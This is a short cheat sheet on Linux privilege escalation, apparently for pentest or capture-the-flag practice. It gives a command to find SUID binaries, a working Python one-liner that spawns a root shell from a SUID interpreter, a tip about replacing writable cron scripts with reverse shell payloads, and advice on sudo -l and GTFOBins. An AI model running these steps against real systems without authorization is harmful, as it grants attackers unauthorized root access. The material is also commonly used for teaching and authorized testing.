## Linux Privilege Escalation Vectors

### SUID Binaries
Look for SUID programs:
find / -perm -4000 -type f 2>/dev/null
If you find `/usr/bin/python3.8` with SUID, escalate:
python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

### Cron Jobs
Check `/etc/crontab` and systemd timers. Writable cron scripts can be replaced with reverse shell payloads.

### Sudo -l
Always run `sudo -l` to see what commands you can run as root without a password. GTFOBins is your friend.
